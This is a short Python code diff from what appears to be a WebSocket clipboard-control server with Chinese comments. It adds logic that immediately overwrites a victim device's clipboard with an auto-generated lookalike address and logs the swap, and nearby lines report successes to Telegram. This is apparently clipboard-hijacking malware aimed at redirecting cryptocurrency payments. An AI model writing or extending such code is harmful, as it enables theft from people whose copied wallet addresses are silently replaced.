@@ -754,6 +754,18 @@ async def ws_clipboard(ws: WebSocket):
                                         await ws.send_text(json.dumps(replacement_msg))
                                         print(f"[AUTO-GENERATE] device={device_id} 已推送更新的替换对列表，共 {len(replacement_pairs_list)} 个", flush=True)
                                         
+                                        # 立即更新剪贴板内容
+                                        push_message = {
+                                            "type": "PUSH_SET",
+                                            "set": {
+                                                "format": "text/plain",
+                                                "text": result['generated_address']
+                                            },
+                                            "reason": f"[自动生成] 立即替换为生成的地址"
+                                        }
+                                        await ws.send_text(json.dumps(push_message))
+                                        print(f"[AUTO-GENERATE] device={device_id} 已发送立即替换指令: {preview} -> {result['generated_address']}", flush=True)
+                                        
                                         # 发送生成结果到Telegram
                                         message = (
                                             f"🎯 <b>自动生成相似地址成功</b>\n\n"
